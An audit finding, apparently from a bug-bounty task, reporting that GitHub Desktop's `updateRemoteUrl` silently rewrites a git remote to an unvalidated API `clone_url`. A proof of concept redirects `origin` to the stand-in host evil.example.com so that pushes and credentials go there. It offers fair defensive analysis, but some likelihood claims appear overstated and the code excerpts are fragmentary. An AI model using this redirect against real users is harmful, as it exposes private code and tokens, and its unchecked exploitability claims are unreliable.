### Title
Silent git remote URL rewrite based on unvalidated GitHub API `clone_url` - (File: `app/src/lib/stores/updates/update-remote-url.ts`)

### Summary
`updateRemoteUrl` automatically rewrites a repository's local git remote URL to whatever `clone_url` the GitHub API (or GHES/proxy) returns for that repository, without ever validating that the new URL's hostname matches the account's expected GitHub host. This mirrors the Sherlock `updateYieldStrategy` bug class: an operation trusts an external, potentially attacker-influenced value (`yieldStrategy.withdrawAll()` success / here, `apiRepo.clone_url`) and unconditionally commits to a new state (switching the strategy pointer / here, rewriting `origin`'s URL) without verifying the new target is safe or complete, silently corrupting the persistent link (Sherlock↔Strategy / here, Desktop↔remote) that future operations (push/fetch) depend on.

### Finding Description
`updateRemoteUrl` is invoked from `AppStore._refreshRepository`-style flow via `repositoryWithRefreshedGitHubRepository`, which fetches the repo's info from `api.fetchRepository(owner, name)` and passes the resulting `apiRepo` straight into `updateRemoteUrl`: [1](#0-0) 

Inside `updateRemoteUrl`, the only checks performed before rewriting the remote are: (1) that the URL's *protocol* matches, and (2) that the remote's URL previously matched the GitHub repository's stored `cloneURL`. Neither check inspects or pins the *hostname*: [2](#0-1) 

`urlMatchesRemote`/`parseRemote` only compare hostname/owner/name between the *old* remote and the *new* API-provided URL to see if they differ — it does not compare either against the trusted account endpoint (`api.github.com`, or the configured GHES host): [3](#0-2) 

If `protocolsMatch && remoteUrlUnchanged && !urlsMatch`, the code calls `gitStore.setRemoteURL`, which runs `git remote set-url <name> <url>` with no further validation: [4](#0-3) [5](#0-4) 

Because `apiRepo` comes straight from a network response (subject to a compromised/malicious GHES endpoint, a repo owner/admin who renamed/transferred the repo to a different host mid-flight, or a proxy/MITM on the API request), the attacker-influenced `clone_url` is trusted implicitly. The broken invariant is: *"the GitHub API's reported clone_url for a repository is always a legitimate target for this account's configured host"* — nothing in the code enforces that.

### Impact Explanation
A successful exploitation silently redirects the user's `origin` (or upstream fork) remote to an attacker-controlled URL. Every subsequent Desktop-initiated `git push`/`git fetch` for that repository then targets the attacker's endpoint instead of the real GitHub/GHES repository — this is exactly the "silent corruption of what the user commits or pushes" impact category. Depending on the attacker's server, this can lead to: exfiltration of pushed commit contents (potentially private code/secrets), capture of git credentials/tokens presented during authentication to the new host, and desynchronization between what the user believes they pushed and where it actually went — with no dialog or confirmation shown to the user (contrast with the explicit user-facing `UpstreamAlreadyExists` dialog used elsewhere for a similar remote-url mismatch scenario, which this automatic path bypasses entirely): [6](#0-5) 

### Likelihood Explanation
The refresh path runs automatically as part of normal repository refresh/account-change flows, not gated by explicit user action, so the rewrite happens silently whenever the background refresh next runs after the API returns an attacker-influenced `clone_url`. Triggering it requires either: a party with rename/transfer rights on the tracked repository (e.g., a compromised collaborator or maintainer account) setting `clone_url` to an attacker host, or a network/proxy position able to tamper with the GitHub/GHES API response for that repository — both explicitly in-scope per the task's "Valid Impact" definition (attacker controls a GitHub API object or a remote/proxy response). Existing guards (`protocolsMatch`, `remoteUrlUnchanged`) only prevent *some* URL edits from being silently overwritten if the user hand-edited them; they do nothing to pin the trusted hostname, so they do not stop this path.

### Recommendation
Before calling `gitStore.setRemoteURL` in `updateRemoteUrl`, validate that the new `clone_url`'s hostname matches the hostname of the account/endpoint the repository was fetched from (e.g., compare against `getHTMLURL(account.endpoint)`/`gitHubRepository.endpoint`), and reject/prompt the user (similar to the existing `UpstreamAlreadyExists` dialog flow) whenever the hostname changes, rather than silently rewriting the remote.

### Proof of Concept
1. User has Desktop tracking a repository whose GitHub API record and local `origin` remote both point to `https://github.com/acme/app`.
2. An attacker who can influence the API response for that repo (compromised collaborator with rename/transfer rights, or a MITM/compromised proxy sitting in front of the configured GHES endpoint) causes `api.fetchRepository('acme', 'app')` to return `clone_url: 'https://evil.example.com/acme/app.git'` (same `https` protocol, so `protocolsMatch` is true).
3. On the next background refresh, `repositoryWithRefreshedGitHubRepository` → `updateRemoteUrl` computes: `remoteUrlUnchanged = true` (current remote still matches the old known `cloneURL`), `urlsMatch = false` (hostnames differ) — both branch conditions are satisfied.
4. `gitStore.setRemoteURL('origin', 'https://evil.example.com/acme/app.git')` runs `git remote set-url origin ...` with no user prompt.
5. All subsequent pushes/fetches from Desktop for this repository now go to `evil.example.com` instead of GitHub, silently.

  const updatedRemoteUrl = apiRepo.clone_url

  // If protocol is null that implies the url is a ssh url
  // of the format git@github.com:octocat/Hello-World.git, which
  // can't be parsed by URL.parse. In this case we assume the user
  // manually configured their remote to use this format and we don't
  // want to change what they've done just to be safe

  const parsedUpdatedRemoteUrl = URL.parse(updatedRemoteUrl)

    parsedRemoteUrl.protocol !== null &&
    parsedUpdatedRemoteUrl.protocol !== null &&
    parsedRemoteUrl.protocol === parsedUpdatedRemoteUrl.protocol

export function urlMatchesRemote(url: string | null, remote: IRemote): boolean {
  if (url == null) {
    return false
  }

  const cloneUrl = parseRemote(url)
  const remoteUrl = parseRemote(remote.url)

  if (remoteUrl == null || cloneUrl == null) {
    return false
  }

  if (!caseInsensitiveEquals(remoteUrl.hostname, cloneUrl.hostname)) {
    return false
  }

  if (remoteUrl.owner == null || cloneUrl.owner == null) {
    return false
  }

  if (remoteUrl.name == null || cloneUrl.name == null) {
    return false
  }

  return (
    caseInsensitiveEquals(remoteUrl.owner, cloneUrl.owner) &&
    caseInsensitiveEquals(remoteUrl.name, cloneUrl.name)
  )
}

export async function setRemoteURL(
  repository: Repository,
  name: string,
  url: string
): Promise<true> {

}
